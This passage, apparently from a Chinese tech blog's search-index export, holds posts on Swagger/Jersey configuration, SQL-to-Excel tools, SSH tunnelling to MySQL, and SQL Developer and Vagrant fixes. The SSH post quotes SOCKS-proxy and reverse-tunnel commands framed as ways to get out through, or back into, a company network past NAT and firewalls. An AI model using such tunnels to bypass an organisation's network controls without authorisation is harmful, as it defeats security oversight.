-DgroupId=io.swagger -DartifactId=swagger-jersey2-jaxrs -Dversion=1.6.2 -Ddest=/mnt/d/mvntest</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://stackoverflow.com/questions/7110114/how-to-simply-download-a-jar-using-maven\" target=\"_blank\" rel=\"noopener\">How to simply download a JAR using Maven? - Stack Overflow</a></p>\n<p>但後來發現還是不比<a href=\"https://malagege.github.io/blog/2020/06/15/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/#%E4%B8%80%E7%A8%AE%E5%BF%AB%E9%80%9F%E8%BC%B8%E5%85%A5%E5%BB%BA%E7%BD%AE%E6%96%B9%E6%B3%95\">Maven 建置專案初體驗 | 程式狂想筆記</a>設定好 pom.xml 在執行<code>mvn dependency:copy-dependencies</code>快速</p>\n<h2 id=\"配製-swagger-web-xml\"><a href=\"#配製-swagger-web-xml\" class=\"headerlink\" title=\"配製 swagger(web.xml)\"></a>配製 swagger(web.xml)</h2><p>以下參照<a href=\"https://blog.devzeng.com/blog/jersey-swagger-api.html\" target=\"_blank\" rel=\"noopener\">Jersey整合Swagger自动生成API文档</a></p>\n<ol>\n<li>可依照源專案 servlet 還是filter 做調整</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- servlet 設定--&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- jersey --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>jersey<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.glassfish.jersey.servlet.ServletContainer<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>jersey.config.server.provider.packages<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>io.swagger.jaxrs.listing,com.devzeng.service.schedule.api<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>jersey<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/api/*<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>新增swagger配置</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- swagger --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>Jersey2Config<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>io.swagger.jersey.config.JerseyJaxrsConfig<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>api.version<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>1.0.0<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>swagger.api.basepath<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>http://localhost:8080/api<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>說明：</p>\n<pre><code>swagger.api.basepath:這個是api訪問的baseurl\n</code></pre><h2 id=\"配置前端-swagger-UI\"><a href=\"#配置前端-swagger-UI\" class=\"headerlink\" title=\"配置前端 swagger UI\"></a>配置前端 swagger UI</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span>  https://github.com/swagger-api/swagger-ui.git</span><br><span class=\"line\">git checkout 2.x <span class=\"comment\"># 由於版本過舊，建議使用這個版本</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>4、配置swagger-ui<br>(1) 下載swagger-ui</p>\n<p><a href=\"https://github.com/swagger-api/swagger-ui\" target=\"_blank\" rel=\"noopener\">https://github.com/swagger-api/swagger-ui</a></p>\n<p>推薦使用2.x版本<br>(2) 拷貝dist目錄下面的文件到webroot下面<br>(3) 修改index.html頁面的url地址</p>\n<p>url = “<a href=\"http://localhost:8080/api/swagger.json&quot;\" target=\"_blank\" rel=\"noopener\">http://localhost:8080/api/swagger.json&quot;</a>;</p>\n</blockquote>\n<h2 id=\"其他文章\"><a href=\"#其他文章\" class=\"headerlink\" title=\"其他文章\"></a>其他文章</h2><p><a href=\"https://hub.packtpub.com/restful-java-web-services-swagger/\" target=\"_blank\" rel=\"noopener\">Documenting RESTful Java Web Services using Swagger</a></p>\n<p><a href=\"https://www.jianshu.com/p/291217345e5d\" target=\"_blank\" rel=\"noopener\">1: Spring Boot 使用JSONDoc快速生成Restful API - 简书</a></p>\n","categories":["Java"]},{"title":"sql 匯出csv ,Excel 工具","url":"/blog/2020/08/24/sql-%E5%8C%AF%E5%87%BAcsv-Excel-%E5%B7%A5%E5%85%B7/","content":"<p><del>之前有寫過</del><a href=\"https://github.com/malagege/sqlMakecsv\" target=\"_blank\" rel=\"noopener\">malagege/sqlMakecsv: for a sqltocsv package easy sample</a><br>嚴格說是我改別人 code 改寫<br>簡單陽春寫出 sql 連 MySQL(或 Golang 有支援的DB Driver) 轉 csv, Excel<br>注意: 撈出幾百萬資料可能會造成記憶體吃光光<br>可能需要手動分別撈出來</p>\n<a id=\"more\"></a>\n<h2 id=\"自己寫的工具\"><a href=\"#自己寫的工具\" class=\"headerlink\" title=\"自己寫的工具\"></a>自己寫的工具</h2><ol>\n<li><a href=\"https://github.com/malagege/sqlMakecsv\" target=\"_blank\" rel=\"noopener\">malagege/sqlMakecsv: for a sqltocsv package easy sample</a></li>\n</ol>\n<p>最近公司環境 DB 是用 Oracle<br>我當初寫沒有塞 Oracle Driver<br>最後有查到兩個方式</p>\n<p><a href=\"https://github.com/identitii/gdbc/tree/master/wrapper\" target=\"_blank\" rel=\"noopener\">gdbc/wrapper at master · identitii/gdbc</a></p>\n<ol>\n<li>OJDBC (GDBC) 但 Windows WSL 編譯失敗<br>中途發現它編譯還需要改 pom.xml 的 http → https<br>裡面有 native-image 指令<br>後來發現需要裝<a href=\"https://kucw.github.io/blog/2019/10/java-graalvm/\" target=\"_blank\" rel=\"noopener\">GraalVM 介紹 + 安裝教學</a><br>好險 sdkman 可以搞定這一切<br>不過後來排除各種問題<br>還是失敗</li>\n</ol>\n<p><del>沒有在 Linux 環境安裝</del><br><del>所以有空再試試</del><br>編譯出來還是失敗<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Error: Classes that should be initialized at run time got initialized during image building:</span><br><span class=\"line\"> java.sql.DriverManager was unintentionally initialized at build time. To see why java.sql.DriverManager got initialized use -H:+TraceClassInitialization</span><br><span class=\"line\"></span><br><span class=\"line\">com.oracle.svm.core.util.UserError$UserException: Classes that should be initialized at run time got initialized during image building:</span><br><span class=\"line\"> java.sql.DriverManager was unintentionally initialized at build time. To see why java.sql.DriverManager got initialized use -H:+TraceClassInitialization</span><br><span class=\"line\"></span><br><span class=\"line\">\tat com.oracle.svm.core.util.UserError.abort(UserError.java:68)</span><br><span class=\"line\">\tat com.oracle.svm.hosted.classinitialization.ConfigurableClassInitialization.checkDelayedInitialization(ConfigurableClassInitialization.java:526)</span><br><span class=\"line\">\tat com.oracle.svm.hosted.classinitialization.ClassInitializationFeature.duringAnalysis(ClassInitializationFeature.java:227)</span><br><span class=\"line\">\tat com.oracle.svm.hosted.NativeImageGenerator.lambda$runPointsToAnalysis$8(NativeImageGenerator.java:732)</span><br><span class=\"line\">\tat com.oracle.svm.hosted.FeatureHandler.forEachFeature(FeatureHandler.java:70)</span><br></pre></td></tr></table></figure></p>\n<p>這邊有 OJDBC 8 解決方法，但我看 GDBC 好像是用 6<br>不過我不是很熟，所以就沒繼續研究<br><a href=\"https://github.com/quarkusio/quarkus/issues/1658#issuecomment-523618130\" target=\"_blank\" rel=\"noopener\">https://github.com/quarkusio/quarkus/issues/1658#issuecomment-523618130</a></p>\n<ol start=\"2\">\n<li>原生 Oracle 連線<br>oci8<br><a href=\"https://www.oracle.com/tw/database/technologies/instant-client/downloads.html\" target=\"_blank\" rel=\"noopener\">Oracle Instant Client Downloads | Oracle 台灣</a><br>不過不想再 window 上面安裝東西<br>在 WSL 他又認得是 Window<br>所以放棄這個方案</li>\n</ol>\n<p>Oracle 目前還是不能匯出<br>有空再做測試處理</p>\n<p>最後還是放棄測試，因為可能就算可以執行<br>程式搬到別台但腦能不能跑也是一個問題</p>\n<h2 id=\"export2excel\"><a href=\"#export2excel\" class=\"headerlink\" title=\"export2excel\"></a>export2excel</h2><p><a href=\"https://github.com/tinywall/export2excel\" target=\"_blank\" rel=\"noopener\">tinywall/export2excel: Export Mysql/Oracle Data to Excel CSV</a></p>\n<p>在 Github 看到有人寫好的好用工具<br>這個就能使用 OJDBC 成功連到 Oracle<br>可以解決我現階段撈出報表問題</p>\n<p>這邊要設定 Run.bat<br>set path=”C:\\Program Files\\Java\\jdk1.7.0_25\\bin”</p>\n<p>如果是在 Linux 記得要調整</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># window</span></span><br><span class=\"line\"><span class=\"comment\">#javac -d classes -classpath lib\\jdom-1.0.jar;lib\\poi-3.0-rc4-20070503.jar;lib\\ojdbc14.jar;lib\\mysql-connector-java-5.1.6.jar; src/*.java</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Linux</span></span><br><span class=\"line\"><span class=\"comment\"># classpath 要改成 / </span></span><br><span class=\"line\"><span class=\"comment\"># -jar 分號記得要改成冒號 :</span></span><br><span class=\"line\">javac -d classes -classpath lib/jdom-1.0.jar:lib/poi-3.0-rc4-20070503.jar:lib/ojdbc14.jar:lib/mysql-connector-java-5.1.6.jar src/*.java</span><br></pre></td></tr></table></figure>\n<p>CLOB 記得要轉乘 TO_CHAR<br>裡面程式沒有做 CLOB 處理</p>\n","categories":["實用工具"],"tags":["csv","sql","excel"]},{"title":"ssh port forward連MySQL方法(SSH Tunnel)","url":"/blog/2018/12/13/ssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95/","content":"<p>早上看到<a href=\"https://www.facebook.com/groups/616369245163622/permalink/1498950796905458/\" target=\"_blank\" rel=\"noopener\">Backend 台灣 (Backend Tw)</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">傳統老人要連上production db的方法：</span><br><span class=\"line\">...</span><br><span class=\"line\">２　把自己電腦的public key放到這台nano machine上的authorized_keys，以便自己電腦不用每次ssh都要輸入密碼。</span><br><span class=\"line\">３　每次要連上mysql時，先建立ssh port forwarding</span><br><span class=\"line\">ssh -L 9000:yourDBhostname:3306 smallPotato@abc.com</span><br><span class=\"line\">４　然後，看你喜歡用phpMyAdmin也好，mysql bench也好，連線上localhost:9000，這樣子便能連線上production db</span><br></pre></td></tr></table></figure></p>\n<p>以上內容來自<a href=\"https://www.facebook.com/groups/616369245163622/permalink/1498950796905458/\" target=\"_blank\" rel=\"noopener\">Backend 台灣 (Backend Tw) Triton Ho</a></p>\n<p>之前有用過ssh tunnel 代理網頁來看<br>但沒想到可以用在MySQL<br>可能以前沒有深入理解這怎麼傳的 (&gt;////&lt;)</p>\n<a id=\"more\"></a>\n<p>早上看FB看到<code>ssh port forwarding</code><br>沒想到還有這種操作</p>\n<p>長期用phpmyadmin真的很痛苦<br>但是用這個方法可以用workbench連到MySQL(內網)<br>想說有沒有快速的方法</p>\n<h2 id=\"DBeaver\"><a href=\"#DBeaver\" class=\"headerlink\" title=\"DBeaver\"></a>DBeaver</h2><p><a href=\"https://dbeaver.io/\" target=\"_blank\" rel=\"noopener\">DBeaver Community | Free Universal Database Tool</a></p>\n<p>連線設定可以設定SSH Tunnel<br>這樣以後一鍵迅速連MySQL<br><img src=\"https://dbeaver.com/wp-content/uploads/2018/09/redis-connection-ssh.png\" alt=\"\"></p>\n<p>設定非常簡單簡單，也不需要打ssh指令</p>\n<h2 id=\"SSH-相關資料\"><a href=\"#SSH-相關資料\" class=\"headerlink\" title=\"SSH 相關資料\"></a>SSH 相關資料</h2><p>由於我家裡沒有兩個不同網段<br>所以我就沒有實驗<br>但基於理解還是仔細爬了一下網路文章<br>不太想花太多時間研究<br>簡單整理一下</p>\n<ul>\n<li><p>Local port forwarding</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -L &lt;local_port&gt;:&lt;target_host&gt;:&lt;target_port&gt; remote_user@remote_host</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Remote port forwarding (Reverse SSH)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -R 5900:localhost:22 guest@remote-pc</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>SOCKS Proxy Forwarding</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -C -D 8080 cwliu@123.123.123.123</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><a href=\"http://blog.codylab.com/ssh-port-forwarding/\" target=\"_blank\" rel=\"noopener\">SSH Tunnel</a><br><a href=\"/blog/2018/12/13/ssh-port-forward連MySQL方法/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p>Local port forwarding 和 SOCKS Proxy Forwarding<br>感覺兩個都好像</p>\n<p>有看到<a href=\"https://www.ubuntu-tw.org/modules/newbb/viewtopic.php?viewmode=compact&amp;topic_id=17538\" target=\"_blank\" rel=\"noopener\">上班族ssh tunnel求生手冊 [論壇 - Ubuntu 與工具程式及軟體推薦] | Ubuntu 正體中文站</a><br><a href=\"/blog/2018/12/13/ssh-port-forward連MySQL方法/web2.png\" title=\"備份圖\">備份圖</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">範例1：</span><br><span class=\"line\">在公司，透過外面的電腦當proxy，連到外面。</span><br><span class=\"line\">ssh -NfD 8888 remote_ip</span><br><span class=\"line\">-N : 不執行任何命令</span><br><span class=\"line\">-f : 在背景執行</span><br><span class=\"line\">-D : 建socks5 的proxy</span><br><span class=\"line\">這時候,瀏覽器和msn在socks 5 proxy設定的欄位填上localhost:8888 。</span><br><span class=\"line\">連出去的連驗就是加密，並且是穿過remot_ip的連線。</span><br><span class=\"line\"></span><br><span class=\"line\">範例2:</span><br><span class=\"line\">在公司，透過外面的電腦連BBS。</span><br><span class=\"line\">ssh -NfL 2323:bbs.gamer.com.tw:23 remote_ip</span><br><span class=\"line\">-L : 將local port 轉向</span><br><span class=\"line\">telnet localhost 2323 就可以連到巴哈，而且是加密的。</span><br><span class=\"line\">也可用PCManx連localhost 2323也是一樣的意思。</span><br><span class=\"line\"></span><br><span class=\"line\">範例3:</span><br><span class=\"line\">有時候假日，想要連回公司加個班。</span><br><span class=\"line\">但是公司是NAT，所以沒辦法這樣作。</span><br><span class=\"line\">可以運用TCP雙向傳輸的特性來辦到這件事。</span><br><span class=\"line\">ssh -NfR 2222:localhost:22 remote_ip</span><br><span class=\"line\">-R : 將remote port轉向 </span><br><span class=\"line\"></span><br><span class=\"line\">....</span><br><span class=\"line\"></span><br><span class=\"line\">範例一和範例二差別在於 SOCKS Proxy 的建立。這是因為 HTTP Proxy 會貼上/處理/取下額外的資訊，不能直接轉送(Forwarding)。範例二就真的是照本宣科地轉送。(當然，兩者轉送之前都有加密。)</span><br></pre></td></tr></table></figure></p>\n<p>簡單來說<code>Local port forwarding</code>只能對外一個port轉出去，所以不能用在看網頁上面<br>但是<code>SOCKS Proxy Forwarding</code>就可以對印remote可以連到的主機做連線(而且是多個)<br>這個用在網頁上面很方便</p>\n<p>當然還有查了一些:<br>除了目前連mysql感覺其他地方目前用不上<br>所以先留著筆記</p>\n<ul>\n<li><a href=\"https://medium.com/@achilles1452/ssh-forwarding-%E5%85%A7%E9%83%A8%E7%B6%B2%E8%B7%AF%E9%80%A3%E7%B7%9A-b79c13e2cdc8?fbclid=IwAR0HpLQ4tZhi5gEOZ37Ii-lS68_1_6ysL3nam7Aimaig1LeOwx1ciljZ9iY\" target=\"_blank\" rel=\"noopener\">SSH Forwarding 內部網路連線 – 繁華上海城 ＆ 邊緣小宅女 – Medium</a><a href=\"/blog/2018/12/13/ssh-port-forward連MySQL方法/web3.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"http://blog.codylab.com/ssh-port-forwarding/\" target=\"_blank\" rel=\"noopener\">SSH Tunnel</a></li>\n<li><a href=\"https://ez3c.tw/2043\" target=\"_blank\" rel=\"noopener\">Reverse SSH Tunnel實際運用，搭配auotssh永不斷線，putty建立反向tunnel :: 哇哇3C日誌</a></li>\n<li><a href=\"https://blog.windrunner.me/sa/reverse-ssh.html\" target=\"_blank\" rel=\"noopener\">使用 autossh 建立反向 SSH 连接 · 不立不破</a></li>\n<li><a href=\"https://gwokae.mewggle.com/wordpress/2010/08/%E5%88%A9%E7%94%A8ssh-tunnel%E9%80%A3%E7%B7%9A%E8%87%B3%E5%85%A7%E9%83%A8%E7%B6%B2%E8%B7%AF/\" target=\"_blank\" rel=\"noopener\">利用SSH Tunnel連線至內部網路 - LinXblog</a></li>\n<li><a href=\"https://shazi.info/%E7%94%A8-ssh-tunnel-%E4%BE%86%E9%81%BF%E5%85%8D%E9%98%B2%E7%81%AB%E7%89%86%E9%98%BB%E6%93%8B%E5%AF%A6%E4%BD%9C%E8%88%87%E5%8F%8D%E5%88%B6/\" target=\"_blank\" rel=\"noopener\">用 SSH Tunnel 來避免防火牆阻擋實作與反制 | Mr. 沙先生</a></li>\n<li><a href=\"https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/\" target=\"_blank\" rel=\"noopener\">玩转SSH端口转发 | Fundebug博客</a></li>\n<li><a href=\"http://87showmin.blogspot.com/2012/06/ssh-port-forwarding-using-putty.html\" target=\"_blank\" rel=\"noopener\">87showmin的筆記本: ssh port forwarding using Putty</a></li>\n<li><a href=\"https://blog.gtwang.org/linux/ssh-tunnel-socks-proxy-forwarding-tutorial/\" target=\"_blank\" rel=\"noopener\">SSH Tunnel 通道打造加密 Proxy，透過外部 Linux 伺服器上網 - G. T. Wang</a></li>\n<li><a href=\"http://applezulab.netdpi.net/02-linux-xi-tong-cao-zuo/set-proxy-server-in-bash\" target=\"_blank\" rel=\"noopener\">在 bash 中設定 Proxy server - 蘋果小豬筆記</a></li>\n<li><a href=\"https://ifconfig.co/\" target=\"_blank\" rel=\"noopener\">What is my IP address? — ifconfig.co</a></li>\n<li><a href=\"https://www.ubuntu-tw.org/modules/newbb/viewtopic.php?viewmode=compact&amp;topic_id=17538\" target=\"_blank\" rel=\"noopener\">上班族ssh tunnel求生手冊 [論壇 - Ubuntu 與工具程式及軟體推薦] | Ubuntu 正體中文站</a></li>\n</ul>\n<p>Date: 2018-12-20</p>\n<p>Filezilla預設沒有做ssh tunnel<br>但有找到WinScp能做到</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/wangkongming/p/4124945.html\" target=\"_blank\" rel=\"noopener\">winScp如何通过隧道代理进行远程连接 - KoMiles - 博客园</a></li>\n<li><a href=\"http://blog.faq-book.com/?p=1483\" target=\"_blank\" rel=\"noopener\">WinSCP使用教學 | FAQ Book</a></li>\n<li><a href=\"https://tw.saowen.com/a/b855ee1a0a683498261219a649f983e3d1916ed1974556022a2a5d418fdd100f\" target=\"_blank\" rel=\"noopener\">SSH使用教程( Bitvise Tunnelier+Chrome+Proxy Switchy) - 掃文資訊</a></li>\n<li><a href=\"https://ssorc.tw/6866\" target=\"_blank\" rel=\"noopener\">瀏覽器設定 proxy 透過 SSH Tunnel 連線網站 | SSORC.tw</a></li>\n<li><a href=\"https://www.jianshu.com/p/bb4cde6e88c6\" target=\"_blank\" rel=\"noopener\">DownloadManager实现版本更新，监听下载进度 - 简书</a></li>\n</ul>\n","categories":["MySQL"],"tags":["mysql","port forward"]},{"title":"sqldeveloper 打開閃退解決方法","url":"/blog/2020/03/07/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/","content":"<p>最近使用 sqldeveloper 開啟出現問題，瞬間打開會閃退<br>網路上查到一些原因<br>但都無法解決</p>\n<a id=\"more\"></a>\n<p>網路上有看到三種解決方法，這邊整理一下</p>\n<h2 id=\"抓舊版-jdk\"><a href=\"#抓舊版-jdk\" class=\"headerlink\" title=\"抓舊版 jdk\"></a>抓舊版 jdk</h2><p>這邊是網路大多數都是使用這個方法，但我無法解決。<br>我發現使用這個都是抓 sqldeveloper 不包含 jdk 版本<br>通常 jdk 版本不能太新(需要 1.6 版本)<br>還有需要設定 conf jdk 路徑<br>sqldeveloper.conf 設定 SetJavaHome<br>可參考<a href=\"https://blog.csdn.net/weixin_38569499/article/details/80316277\" target=\"_blank\" rel=\"noopener\">Oracle 11g自带的sqldeveloper.exe打不开问题_数据库_weixin_38569499的博客-CSDN博客</a></p>\n<h2 id=\"清除使用者暫存資料\"><a href=\"#清除使用者暫存資料\" class=\"headerlink\" title=\"清除使用者暫存資料\"></a>清除使用者暫存資料</h2><blockquote>\n<p>In my case i had 2 folders under C:\\Users\\username\\AppData\\Roaming\\</p>\n<pre><code>sqldeveloper\nSQL developer\n</code></pre><p>after removing both of them and launching installation dir\\sqldeveloper\\sqldeveloper\\bin\\sqldeveloper64.exe it worked.</p>\n</blockquote>\n<p>刪除 C:\\Users\\username\\AppData\\Roaming\\ 裡面的 <code>sqldeveloper</code>,<code>SQL developer</code> 兩個資料夾<br>就可以正常運行</p>\n<p>仔細想想一開始打開 sqldeveloper 我有移動過位置<br>不知道是不是這個關係，所以才會導致?</p>\n<h2 id=\"看到奇怪的解決方式\"><a href=\"#看到奇怪的解決方式\" class=\"headerlink\" title=\"看到奇怪的解決方式\"></a>看到奇怪的解決方式</h2><p>試過，我的不是這個問題</p>\n<p><a href=\"https://www.itread01.com/content/1544637086.html\" target=\"_blank\" rel=\"noopener\">SQL Developer 開啟失敗解決辦法 - IT閱讀</a></p>\n<h2 id=\"Dbeaver-連-OJDBC-方法\"><a href=\"#Dbeaver-連-OJDBC-方法\" class=\"headerlink\" title=\"Dbeaver 連 OJDBC 方法\"></a>Dbeaver 連 OJDBC 方法</h2><p>Dbeaver 會導向官網叫你下載 OJDBC ，但這個有分版本<br>我因為懶惰使用 sqldeveloper 裡面 OJDBC (*.jar)<br>可以登入，但查詢 SQL 會有錯誤訊息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">org.jkiss.dbeaver.model.sql.DBSQLException: SQL 错误: jdbc 驱动内部错误</span><br><span class=\"line\">\tat org.jkiss.dbeaver.model.impl.jdbc.exec.JDBCStatementImpl.executeStatement(JDBCStatementImpl.java:134)</span><br><span class=\"line\">\tat org.jkiss.dbeaver.ui.editors.sql.execute.SQLQueryJob.executeStatement(SQLQueryJob.java:486)</span><br><span class=\"line\">\tat org.jkiss.dbeaver.ui.editors.sql.execute.SQLQueryJob.lambda$0(SQLQueryJob.java:424)</span><br><span class=\"line\">\tat org.jkiss.dbeaver.model.exec.DBExecUtils.tryExecuteRecover(DBExecUtils.java:159)</span><br><span class=\"line\">\tat org.jkiss.dbeaver.ui.editors.sql.execute.SQLQueryJob.executeSingleQuery(SQLQueryJob.java:416)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>後來我發現，要去官網抓 ojdbc-full.tar.gz<br>匯出全部 jar ，去設定 Dbeaver 就能設定了</p>\n<p>注意 OJDBC 也有分版本，要使用對應 Oracle 版本</p>\n<h2 id=\"想關連結\"><a href=\"#想關連結\" class=\"headerlink\" title=\"想關連結\"></a>想關連結</h2><p><a href=\"https://blog.csdn.net/weixin_38569499/article/details/80316277\" target=\"_blank\" rel=\"noopener\">Oracle 11g自带的sqldeveloper.exe打不开问题_数据库_weixin_38569499的博客-CSDN博客</a><br><a href=\"https://stackoverflow.com/questions/22810318/sqldeveloper-not-starting\" target=\"_blank\" rel=\"noopener\">sql - SQLDeveloper not starting - Stack Overflow</a><br><a href=\"https://ithelp.ithome.com.tw/articles/10198477\" target=\"_blank\" rel=\"noopener\">Oracle SQL Developer 小技巧 #3 : 電腦當機、沒存檔救回之前編寫的SQL Script - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n","categories":["SQL"],"tags":["oracle","sqldeveloper"]},{"title":"vagrant 啟動無法自動掛載解決方法","url":"/blog/2020/06/26/vagrant-%E5%95%9F%E5%8B%95%E7%84%A1%E6%B3%95%E8%87%AA%E5%8B%95%E6%8E%9B%E8%BC%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/","content":"<p>最近發現 Ubuntu 某一版就不能做自動掛載<br>會出現<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Vagrant was unable to mount VirtualBox shared folders. This is usually</span><br><span class=\"line\">because the filesystem &quot;vboxsf&quot; is not available. This filesystem is</span><br><span class=\"line\">made available via the VirtualBox Guest Additions and kernel module.</span><br><span class=\"line\">Please verify that these guest additions are properly installed in the</span><br><span class=\"line\">guest. This is not a bug in Vagrant and is usually caused by a faulty</span><br><span class=\"line\">Vagrant box. For context, the command attempted was:</span><br><span class=\"line\"></span><br><span class=\"line\">mount -t vboxsf -o uid=1000,gid=1000 vagrant /vagrant</span><br><span class=\"line\"></span><br><span class=\"line\">The error output from the command was:</span><br><span class=\"line\"></span><br><span class=\"line\">/sbin/mount.vboxsf: mounting failed with the error: No such device</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>其實只要安裝<br>vagrant plugin install vagrant-vbguest</p>\n<p>就解決了</p>\n","categories":["Vagrant"],"tags":["vagrant","virtualbox"]},{"title":"swoole 需要學習前了解一些東西整理小記","url":"/blog/2019/09/20/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/","content":"<p>最近<del>一時衝動</del>報名 swoole 課程<br>我對高併發實作還滿感興趣<br>好奇怎麼運用一些方法解決<br>今天看了 <a href=\"https://wiki.swoole.com/wiki/page/487.html\" target=\"_blank\" rel=\"noopener\">學習Swoole需要掌握哪些基礎知識-Swoole-Swoole文檔中心</a> 發現裡面很多名詞不會<br>不想浪費錢，趕快臨時抱佛腳</p>\n<a id=\"more\"></a>\n<p>本篇是我找來資訊，看到的內容打成自己的感想，所以也不是很正確的東西，反正是我自己筆記!!</p>\n<h2 id=\"多進程-多線程\"><a href=\"#多進程-多線程\" class=\"headerlink\" title=\"多進程/多線程\"></a>多進程/多線程</h2><p>多年來有看到執行緒跟多程序執行的差別，今天終於可以好好的想一下</p>\n<h3 id=\"程序-與-執行緒差別\"><a href=\"#程序-與-執行緒差別\" class=\"headerlink\" title=\"程序 與 執行緒差別\"></a>程序 與 執行緒差別</h3><p>其實很久以前有想這個問題，但一直沒有找解答<br>我有想出兩個差別，可以共用全域變數，另外一個不行<br>今天我又有更多想法，多程序吃的記憶體資源會比多執行緒吃的多<br>畢竟1個 electron 跟開 1000 個 electron 